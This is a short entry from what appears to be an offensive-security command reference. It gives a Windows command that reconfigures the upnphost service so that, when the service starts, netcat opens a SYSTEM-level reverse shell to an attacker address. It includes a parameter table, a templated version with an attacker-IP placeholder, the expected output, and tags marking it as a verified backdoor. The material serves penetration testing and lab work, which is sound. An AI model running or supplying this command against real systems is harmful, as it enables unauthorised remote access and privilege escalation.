---
id: 8ac9752d-54e3-4993-80c4-e0df9e9e76ca
name: sc-config-upnphost-netcat-backdoor
type: command
executor: cmd
data: >-
  sc config upnphost binpath= "C:\nc.exe -nv 10.11.0.73 4343 -e
  C:\WINDOWS\System32\cmd.exe"
output: >-
  SUCCESS: The configuration of the upnphost service has been changed
  successfully.
created_at: '2023-04-06T03:56:29.545002+00:00'
updated_at: '2023-04-10T20:37:52.272360+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - backdoor
verified: true
validated: true
---

# sc-config-upnphost-netcat-backdoor

## Command

```cmd
sc config upnphost binpath= "C:\nc.exe -nv 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
```

## Description

Configures the service to launch a netcat reverse shell to an attacker IP/port on start, providing SYSTEM shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sc config | Service config command | Yes |
| upnphost | Target service | Yes |
| binpath= | Sets executable path | Yes |
| "C:\nc.exe -nv 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe" | Nc command: verbose connect to IP port, exec cmd.exe | Yes |

## Examples

### Basic Usage

```cmd
sc config upnphost binpath= "C:\nc.exe -nv 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
```

### Advanced Usage

```cmd
sc config <service> binpath= "nc.exe -nv $_ATTACKER_IP $_PORT -e cmd.exe"
```

## Expected Output

```
[SC] ChangeServiceConfig SUCCESS
```

Start service for shell.

## Related

- [[procedures/Exploit-UPnP-Host-Service-for-Privilege-Escalation-on-Windows-XP-SP1]]
- [[tools/Netcat]]
